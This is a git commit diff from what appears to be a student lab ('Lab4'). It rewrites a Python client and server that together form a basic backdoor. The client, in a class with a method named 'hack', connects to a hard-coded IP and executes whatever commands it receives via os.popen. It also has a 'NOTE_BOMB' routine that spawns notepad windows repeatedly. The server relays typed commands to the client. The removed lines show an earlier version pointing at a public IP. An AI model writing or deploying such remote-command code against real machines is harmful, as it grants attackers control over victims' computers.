ed38dedf778444ff334c4be39b501885ddf7bc4c
HenrikRosander <34091618+HenrikRosander@users.noreply.github.com>
2020-10-12 11:58:40 +0200

    skiten funkar5 NTE

--- Lab4/Client.py
+++ Lab4/Client.py
@@ -1,13 +1,43 @@
 import socket
 import os
 
-server = socket.socket()
-host = '92.34.183.37'
-port = 1234
+client_ip = socket.gethostbyname(socket.gethostname())
 
+class Client:
+    def __init__(self):
+        self.host = '192.168.1.192'
+        self.port = 1234
+        self.server = socket.socket()
+
+    def connect(self):
+        self.server.connect((self.host, self.port))
+        
+    def send(self,text):
+        self.server.send(text.encode('UTF-8'))
+        
+    def recv(self):
+        self.msg = self.server.recv(1024)
+        return self.msg
+        
+class Operate:
+    def __init__(self):
+        self.serv = Client()
+        self.serv.connect()
+    
+    def hack(self):
+
+        self.serv.send('({0}) @{1}> '.format(client_ip,str(os.getcwd())))
+        self.msg = self.serv.recv()
+
+        if self.msg.split(' ')[0] == 'NOTE_BOMB':
+            #Notepad Bomber
+            for i in range(int(self.msg.split(' ')[1])):
+                data = os.popen('notepad.exe')
+            else:
+                data= os.popen(self.msg)
+            self.serv.send('Command done!')
 run = True
-server.connect((host,port))
+
+bot = Operate()
 while run:
-    msg = server.recv(1024)
-    os.popen(msg.decode('UTF-8'))
-    server.send('Client Online'.encode('UTF-8'))
+    bot.hack()
--- Lab4/Server.py
+++ Lab4/Server.py
@@ -1,25 +1,51 @@
 import socket
 
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = '192.168.1.192'
-port = 1234
 
-server.bind((host,port))
-server.listen(5)
+class Server:
+    def __init__(self):
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.host = '192.168.1.192'
+        self.port = 1234
+    def bind(self):
+        self.server.bind((self.host, self.port))
+
+    def accept(self):
+        client, addr = self.server._accept()
+        self.client = client
+        self.addr = addr
+        print('Got connection from ', self.addr)
+
+    def send(self,data): #send data
+        self.client.send(data.encode('UTF-8'))
+
+    def recv(self): #recive data
+        self.msg = self.client.recv(20400).decode('UTF-8')
+        return self.msg
+
+
+
+serv = Server()
+serv.bind()
+serv.accept()
+
+#server.bind((host,port))
+#server.listen(5)
 
 
 run = True
-client, addr = server.accept()
-print('Got connection from', addr)
+#client, addr = server.accept()
+#print('Got connection from', addr)
+
 while run:
     try:
+        client_response = serv.recv()
         data = input('>>>')
-        client.send(data.encode('UTF-8')) #send data to client
-        
-        msg = client.recv(1024)
+        serv.send(data) #send data to client
+        #msg = client.recv(1024)
+        print(serv.recv())
         
     except ConnectionResetError:
         print('Client lost, trying to reconnect')
-        client, addr = server.accept()
+        serv.accept()
 
-print('Got connection from ', addr)
+#print('Got connection from ', addr)
